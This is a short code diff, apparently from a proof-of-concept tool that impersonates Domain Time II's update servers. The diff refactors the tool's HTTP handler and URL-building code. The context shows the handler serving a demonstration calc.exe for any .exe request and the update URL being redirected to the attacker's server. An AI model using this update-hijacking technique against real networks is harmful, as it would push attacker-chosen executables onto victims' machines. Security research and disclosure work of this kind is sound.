@@ -73,10 +73,7 @@ def udp_callback(pkt):
 class CustomHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         # strip extra params for pattern matching
-        if '?' in self.path:
-            path = self.path[:self.path.find('?')]
-        else:
-            path = self.path
+        path = self.path[:self.path.find('?')] if '?' in self.path else self.path
         if path.endswith('.exe'):
             # serve a demonstration payload
             self.path = 'files/calc.exe'
@@ -134,11 +131,7 @@ if __name__ == "__main__":
     sniff_iface = args.interface
     server_ip = args.ip_address
     http_port = args.port
-    if http_port == 80:
-        port_string = ''
-    else:
-        port_string = f':{http_port}'
-
+    port_string = '' if http_port == 80 else f':{http_port}'
     # Legitimate update link example:
     # 'https://www.greyware.com/software/domaintime/update/evaluation.asp'
     if args.http_impersonation:
@@ -149,7 +142,7 @@ if __name__ == "__main__":
         # This points to a URL on our server, not theirs
         update_url = f'http://{server_ip}{port_string}/software/domaintime/update/evaluation.asp'
         #update_url = f'http://{server_ip}{port_string}/software/domaintime/update/registered.asp'
-    
+
     # The typical update domains (DT2 update domain and web domain)
     update_domains = ['update.greyware.com', 'www.greyware.com']
 
